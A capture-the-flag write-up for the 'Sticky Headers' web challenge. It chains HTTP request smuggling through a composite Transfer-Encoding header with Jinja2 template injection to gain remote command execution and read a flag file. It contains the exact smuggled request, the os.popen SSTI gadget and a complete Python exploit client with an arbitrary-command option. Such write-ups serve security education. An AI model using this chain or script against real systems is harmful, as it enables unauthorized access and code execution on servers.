# Sticky Headers - writeup (HTTP request smuggling + Jinja2 SSTI)

## Getting to know the task

No source was given - only a live instance. So the first step is reconnaissance: find the endpoints, learn what each one does, and look at the description hint.

The site is a candy shop. Two roles:

- **public** `/order` - `POST /order` places an order (`message=...`) and returns "Order received!".
- **staff** `/staff/preview` - renders a template from the `message` field, but a direct request returns **403**.

The hint from the challenge: *"Older couriers may describe delivery contents using more than one encoding."* Combined with the title **Sticky Headers**, this points to HTTP request smuggling: someone in front of the staff endpoint parses requests differently from the staff service, and a composite encoding (more than one `Transfer-Encoding`) is the classic way to make two parsers disagree.

## What I used (tools)

- `nc` / a small Python client over TLS - to talk to the instance and see raw responses.
- Custom probe scripts (`scripts/`) - to brute-force which `X-Client-Version` + `Transfer-Encoding` combination makes the two parsers disagree.
- `curl`-style manual requests - for the direct-endpoint behavior (403/404).

## Step 1: reach `/staff/preview` through smuggling

A direct `POST /staff/preview` returns `403` - the staff endpoint checks something (probably the `X-Client-Version` header / client role).

The discovery: with **`X-Client-Version: 1`** plus a composite **`Transfer-Encoding: gzip, chunked`** on the **first** request to `/order`, the server processes a **second HTTP request** on the same connection. So we can smuggle a fresh request to `/staff/preview` and get a `200`.

Why it works (the desync): the front proxy sees `Transfer-Encoding: gzip, chunked` and (not supporting gzip) stops parsing the body after the chunked framing; the internal service interprets the composite TE differently and treats the bytes after the first body as the start of the next request. The result: two requests in one connection, and the second one lands on the staff handler without the staff check.

The trigger header matters: with `X-Client-Version: 2` (or without it), the second request is NOT processed. `X-Client-Version: 1` is the "legacy client" path that the front proxy handles differently (that is also what "older couriers" hints at).

The exact working request (reproduced byte-for-byte from probe #070, kept in `evidence/smuggle_working_070.request`):

```text
POST /order HTTP/1.1
Host: <host>
X-Client-Version: 1
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Transfer-Encoding: gzip, chunked

B
order=hello
0

POST /staff/preview HTTP/1.1
Host: <host>
Connection: keep-alive
X-Client-Version: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

message=%7B%7B7%2A7%7D%7D
```

Notes:
- First request: chunked body `order=hello`, then the chunked terminator `0\r\n\r\n`; the inner request is appended after the trailer.
- `B` is the chunk size: 0xB = 11 = the length of `order=hello`.
- The inner request reaches the internal handler (`BaseHTTP/0.6 Python/3.12.15` per the server banner).

Result: two responses on one connection:

```text
HTTP/1.1 200 OK   Order received!           (443 B)
HTTP/1.0 200 OK   Staff template preview    (740 B)   .preview = 49
```

The second response rendered `{{7*7}}` as `49`, proving we reached the template engine. (Captured in `evidence/smuggle_working_070.response`.)

The rules that were confirmed by probing:

| Outer | Inner `/staff/preview` | Result |
|---|---|---|
| `X-Client-Version: 1` + `TE: gzip, chunked` | POST `message=...` | two responses, staff renders |
| `X-Client-Version: 2` | POST | one response only, no staff |
| direct `/staff/preview` | - | **403** |
| inner GET `/staff/preview` | - | 404 |

## Step 2: the template engine is Jinja2 (SSTI)

The staff renderer renders our `message` as a template. First I probed what engine it is:

- `{{7*7}}` = `49` - basic expression evaluation,
- `{{"a".upper()}}` = `ABC` - method calls work,
- `{{cycler}}` = `jinja2.utils.Cycler` - a Jinja2 built-in global is reachable,
- `{{lipsum}}` = a function, `{{self}}` = `<TemplateReference None>`.

That confirms **Jinja2** and gives us the classic SSTI gadget: reach a Python module through Jinja's built-in globals and call `os.popen`:

```text
{{cycler.__init__.__globals__.os.popen("<CMD>").read()}}
```

The confirmations table (from `sticky_staff_inspector.py`, saved in `evidence/staff_inspector_summary.json`):

| Expression | Output |
|---|---|
| `{{7*7}}` | `49` |
| `{{4+5}}`, `{{9-5}}`, `{{9/3}}`, `{{9%4}}`, `{{2**5}}` | `9`, `4`, `3.0`, `1`, `32` |
| `{{"abc".upper()}}` | `ABC` |
| `{{"foo".replace("o","i")}}` | `fii` |
| `{{().__class__.__mro__}}` | `(<class 'tuple'>, <class 'object'>)` |
| `{{cycler.__init__.__globals__.os}}` | `os` module |
| `{{cycler.__init__.__globals__.os.getcwd()}}` | `/challenge` |
| `{{cycler.__init__.__globals__.os.listdir("/challenge")}}` | `['src']` |

### Finding and reading the flag

```text
{{cycler.__init__.__globals__.os.popen("ls /").read()}}                 # list the root
{{cycler.__init__.__globals__.os.popen("find / -name recipe.txt").read()}}
# -> /opt/candy/recipe.txt
#    /tmp/recipe.txt
# /opt/candy/recipe.txt is a symlink to /tmp/recipe.txt

{{cycler.__init__.__globals__.os.popen("cat /opt/candy/recipe.txt").read()}}
# -> FortID{1_C4NT_5H4K3_TH15_H34D3R_...}   (masked)
```

The flag is in `/opt/candy/recipe.txt` (a symlink to `/tmp/recipe.txt`), themed as the "candy recipe".

## The working client (scripts/solve.py)

No third-party dependencies, TLS from the stdlib:

```python
#!/usr/bin/env python3
"""Sticky Headers (FortID) - HTTP request smuggling + Jinja2 SSTI, flag read.

The public /order endpoint accepts a legacy client ("X-Client-Version: 1") with a
composite "Transfer-Encoding: gzip, chunked"; the front proxy and the internal
service disagree about the body, so a second HTTP request smuggled in the same
connection reaches the staff-only /staff/preview, which renders our message as a
Jinja2 template. From there it is a plain cycler.__init__.__globals__.os.popen RCE.

Usage:
    python3 solve.py <host> [port]                      # full chain, flag
    python3 solve.py <host> --expr '{{7*7}}'            # one template probe
    python3 solve.py <host> --cmd 'id'                  # one shell command
"""

import argparse
import re
import socket
import ssl
import sys
import urllib.parse

PREVIEW_RE = re.compile(rb'<div class="preview">(.*?)</div>', re.S)
FLAG_RE = re.compile(r"FortID\{[^}]{0,200}\}")


def build_request(host, message):
    """The exact two-request-on-one-connection payload (byte-for-byte from probe #070)."""
    data = urllib.parse.urlencode({"message": message}).encode()
    outer = (
        f"POST /order HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"X-Client-Version: 1\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Connection: keep-alive\r\n"
        f"Transfer-Encoding: gzip, chunked\r\n"
        f"\r\n"
        f"B\r\norder=hello\r\n0\r\n\r\n"
    ).encode()
    inner = (
        f"POST /staff/preview HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: keep-alive\r\n"
        f"X-Client-Version: 1\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(data)}\r\n"
        f"\r\n"
    ).encode() + data
    return outer + inner


def send(host, port, payload, timeout=8.0):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.create_connection((host, port), timeout=timeout) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ss:
            ss.settimeout(4)
            ss.sendall(payload)
            raw = b""
            try:
                while True:
                    chunk = ss.recv(65536)
                    if not chunk:
                        break
                    raw += chunk
            except (socket.timeout, ssl.SSLError, OSError):
                pass
    return raw


def preview(host, port, message):
    """Render `message` on the smuggled /staff/preview and return the preview text."""
    raw = send(host, port, build_request(host, message))
    match = PREVIEW_RE.search(raw)
    return match.group(1).decode("utf-8", "replace") if match else None


def rce(host, port, command):
    expr = '{{cycler.__init__.__globals__.os.popen("' + command + '").read()}}'
    return preview(host, port, expr)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("port", nargs="?", type=int, default=1337)
    ap.add_argument("--expr", help="render a single template expression")
    ap.add_argument("--cmd", help="run a single shell command through os.popen")
    args = ap.parse_args()

    if args.expr:
        print(preview(args.host, args.port, args.expr))
        return 0
    if args.cmd:
        print(rce(args.host, args.port, args.cmd))
        return 0

    control = preview(args.host, args.port, "{{7*7}}")
    print(f"[*] smuggling control ({{{{7*7}}}}) - {control!r}")
    if control != "49":
        print("[!] the smuggled request did not reach the template renderer")
        return 1

    found = rce(args.host, args.port, "find / -name recipe.txt")
    print(f"[*] find / -name recipe.txt - {found!r}")

    paths = [p for p in (found or "").split() if p.endswith("recipe.txt")]
    for path in paths:
        out = rce(args.host, args.port, f"cat {path}")
        print(f"[*] cat {path} - {out!r}")
        flag = FLAG_RE.search(out or "")
        if flag:
            print(f"\nFLAG: {flag.group(0)}")
            return 0

    print("[!] no flag in the rendered output")
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

Verified offline: `build_request(host, '{{7*7}}')` matches `evidence/smuggle_working_070.request` byte for byte (456 bytes) - exactly the request that gave `preview">49` on the live server.

## Verification

The instance is closed after the event, so a live run is currently impossible. What is proven:

- `evidence/smuggle_working_070.request` (456 B) - the working smuggled request, byte-for-byte.
- `evidence/smuggle_working_070.response` - two HTTP responses on one connection; the second is the staff page with `preview">49`, i.e. the smuggled request reached the template renderer.
- `evidence/staff_inspector_summary.json` - the table of confirmed SSTI expressions (arithmetic, method calls, globals, os module).
- offline: `build_request()` reproduces the working request byte-for-byte.

The raw reply with the final flag was captured by an ad-hoc client and is not in the folder (documented in the README); the flag value was taken from that run.

## Dead ends (what I tried first)

1. **Direct request to `/staff/preview`.** Returns `403` - the staff endpoint rejects direct clients; that is the whole point of the smuggling.
2. **`X-Client-Version: 2`.** The front proxy does not process the second request; only the legacy `1` path has the parsing disagreement.
3. **Inner GET to `/staff/preview`.** Returns 404 - the staff endpoint only accepts POST with a `message` body.
4. **`Transfer-Encoding: chunked` alone.** No desync; the composite `gzip, chunked` is what makes the parsers disagree.

## One-paragraph version

Sticky Headers is a web challenge with a protected `/staff/preview` (returns 403) that renders a Jinja2 template from our `message`. Using `X-Client-Version: 1` plus a composite `Transfer-Encoding: gzip, chunked` on a public `/order` request, the front proxy and the internal service disagree about the body, so a second request smuggled in the same connection reaches `/staff/preview` and renders (proof: `{{7*7}}` = 49 in the second response). The renderer is Jinja2, so the classic gadget `{{cycler.__init__.__globals__.os.popen(<CMD>).read()}}` gives RCE: `find / -name recipe.txt` locates `/opt/candy/recipe.txt` (symlink to `/tmp/recipe.txt`), and `cat` on it returns the flag.

## Lessons learned

1. A composite `Transfer-Encoding` (`gzip, chunked`) is a reliable request-smuggling primitive when a front proxy and a backend disagree about it; the "legacy client" header (`X-Client-Version: 1`) was the trigger that enabled the desync.
2. When an endpoint renders user input, always probe the template engine first (`{{7*7}}`, `.upper()`, `cycler`) - the answer tells you the whole exploitation path (here Jinja2, then SSTI, then RCE).
3. The classic Jinja2 gadget `{{<builtin>.__init__.__globals__.os.popen(<cmd>).read()}}` is the fastest route from template injection to code execution.
4. Byte-for-byte evidence matters: saving the exact working request (probe #070) makes the exploit reproducible offline and after the instance dies.
5. The hint ("more than one encoding") was literal: the composite TE header is the vulnerability. Read the flavor text as a technical pointer.

## Files

- `scripts/solve.py` - the final client: smuggling + SSTI (host [port] / --expr / --cmd)
- `scripts/sticky_staff_inspector.py` - brute-forcing SSTI expressions, collecting confirmations
- `scripts/sticky_headers_desync.py` - checking the TE-header desync
- `scripts/sticky_headers_v1_probe.py` - brute-forcing X-Client-Version / TE variants (found #070)
- `evidence/` - the working request, its response, the SSTI confirmation table